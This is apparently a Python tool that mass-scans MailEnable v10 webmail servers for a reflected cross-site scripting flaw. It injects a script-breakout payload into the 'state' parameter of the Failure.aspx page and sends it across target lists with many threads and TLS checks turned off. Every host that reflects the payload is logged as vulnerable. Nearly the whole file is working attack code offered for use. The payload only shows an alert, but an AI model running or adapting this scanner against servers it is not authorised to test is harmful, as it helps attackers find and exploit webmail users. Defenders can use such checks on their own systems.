# -*- coding: utf-8 -*-

import requests
import os
import argparse
import urllib3
from urllib.parse import urlparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn
from rich.panel import Panel
from rich.text import Text


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


console = Console()

class MailEnableScanner:
    """
    MailEnable v10 
 
    """

    def __init__(self, threads=10, timeout=10):
        self.threads = threads
        self.timeout = timeout
        self.vulnerable_targets = []

        self.payload = self._build_payload()

    def _build_payload(self):

        raw_payload = '";}alert(document.domain);function test(){"'
        return quote(raw_payload)

    def _get_base_url(self, target):

        if not target.startswith(("http://", "https://")):
            target = "http://" + target
        parsed = urlparse(target)
        return f"{parsed.scheme}://{parsed.netloc}"

    def check_vulnerability(self, target):

        base_url = self._get_base_url(target)
        test_url = f"{base_url}/Mondo/lang/sys/Failure.aspx?state=19753{self.payload}"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 (XSS-Scanner)",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
        }
        try:
            response = requests.get(test_url, headers=headers, timeout=self.timeout, verify=False, allow_redirects=True)
            if (response.status_code == 200 and
                    'Authentication Failed' in response.text and
                    'alert(document.domain)' in response.text):
                return base_url, test_url
        except requests.exceptions.RequestException:

            pass
        return None

    def scan(self, targets):

        with Progress(
            TextColumn("[bold blue]Scanning...", justify="right"),
            BarColumn(bar_width=None),
            "[progress.percentage]{task.percentage:>3.0f}%",
            "•",
            TextColumn("[green]{task.completed} of {task.total} done"),
            "•",
            TimeRemainingColumn(),
            "•",
            TimeElapsedColumn(),
            console=console
        ) as progress:
            task = progress.add_task("[green]Processing targets", total=len(targets))
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                future_to_url = {executor.submit(self.check_vulnerability, target): target for target in targets}
                for future in as_completed(future_to_url):
                    result = future.result()
                    if result:
                        base_url, payload_url = result
                        self.vulnerable_targets.append({"domain": base_url, "payload_url": payload_url})
                        console.print(f"  [bold green]✓ VULNERABLE:[/] [link={payload_url}]{base_url}[/link]")
                    progress.update(task, advance=1)

    def save_results(self, output_file):

        if not self.vulnerable_targets:
            return
        with open(output_file, "w", encoding="utf-8") as f:
            for target in self.vulnerable_targets:
                f.write(f"{target['domain']} => {target['payload_url']}\n")

    def print_summary(self):

        if not self.vulnerable_targets:
            console.print("\n[bold yellow]![/] No vulnerable targets were found.")
            return

        console.print("\n\n" + "="*60)
        console.print("[bold cyan]Vulnerability Scan Summary[/bold cyan]")
        console.print("="*60)

        table = Table(title="[bold green]Vulnerable Targets[/bold green]", show_header=True, header_style="bold magenta")
        table.add_column("ID", style="dim", width=6)
        table.add_column("Vulnerable Domain", style="green")
        table.add_column("Full Payload URL", style="yellow")

        for i, target in enumerate(self.vulnerable_targets, 1):
            table.add_row(str(i), target['domain'], Text(target['payload_url'], overflow="fold"))

        console.print(table)

def print_banner():

    banner_text = """
███╗   ███╗ █████╗ ██╗██╗     ███████╗███╗   ██╗ █████╗ ██████╗ ██╗     ███████╗
████╗ ████║██╔══██╗██║██║     ██╔════╝████╗  ██║██╔══██╗██╔══██╗██║     ██╔════╝
██╔████╔██║███████║██║██║     █████╗  ██╔██╗ ██║███████║██████╔╝██║     █████╗  
██║╚██╔╝██║██╔══██║██║██║     ██╔══╝  ██║╚██╗██║██╔══██║██╔══██╗██║     ██╔══╝  
██║ ╚═╝ ██║██║  ██║██║███████╗███████╗██║ ╚████║██║  ██║██║  ██║███████╗███████╗
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝
    """
    console.print(f"[bold cyan]{banner_text}[/bold cyan]")
    console.print(Panel(
        "[bold] MailEnable v10 - Advanced XSS Scanner[/bold]\n[dim]Author: TheSmartShadow  (Enhanced Version)[/dim]",
        border_style="cyan",
        expand=False
    ))

def main():
    print_banner()

    parser = argparse.ArgumentParser(description="Advanced scanner for MailEnable XSS.")
    parser.add_argument("target", help="A single target URL or a file path containing a list of targets.")
    parser.add_argument("-t", "--threads", type=int, default=50, help="Number of concurrent threads to use (default: 50).")
    parser.add_argument("-o", "--output", default="vulnerable.txt", help="Output file to save vulnerable targets (default: vulnerable.txt).")
    parser.add_argument("--timeout", type=int, default=10, help="Connection timeout in seconds for each request (default: 10).")

    args = parser.parse_args()

    targets = []
    if os.path.isfile(args.target):
        with open(args.target, "r") as file:
            targets = [line.strip() for line in file if line.strip()]
        console.print(f"\n[cyan]*[/] Loaded {len(targets)} targets from [bold]'{args.target}'[/bold].")
    else:
        targets = [args.target.strip()]
        console.print(f"\n[cyan]*[/] Scanning single target: [bold]'{args.target}'[/bold].")

    scanner = MailEnableScanner(threads=args.threads, timeout=args.timeout)
    scanner.scan(targets)
    scanner.print_summary()
    scanner.save_results(args.output)
    
    console.print(f"\n[bold blue]►[/] Scan complete. Vulnerable results saved in '[bold]{args.output}[/bold]'.")

if __name__ == "__main__":
    main()
